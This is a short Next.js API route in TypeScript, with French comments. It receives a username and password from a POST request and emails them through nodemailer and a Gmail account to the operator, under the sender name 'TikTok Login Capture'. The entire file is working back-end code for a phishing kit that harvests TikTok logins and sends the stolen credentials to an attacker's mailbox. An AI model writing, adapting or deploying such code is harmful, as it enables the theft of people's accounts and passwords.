// pages/api/send-credentials.ts
import nodemailer from 'nodemailer';
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).end('Method Not Allowed');
  }

  // Récupération des identifiants depuis le corps de la requête
  const { username, password } = JSON.parse(req.body);

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS,
      },
    });

    const mailOptions = {
      from: `"TikTok Login Capture" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER, // tu peux aussi mettre un autre mail
      subject: 'Nouveaux identifiants TikTok reçus',
      text: `Voici les identifiants TikTok capturés :\n\nNom d'utilisateur : ${username}\nMot de passe : ${password}`,
    };

    await transporter.sendMail(mailOptions);

    res.status(200).json({ message: 'Credentials sent successfully' });
  } catch (err) {
    console.error('Error sending email:', err);
    res.status(500).json({ error: 'Failed to send email' });
  }
}
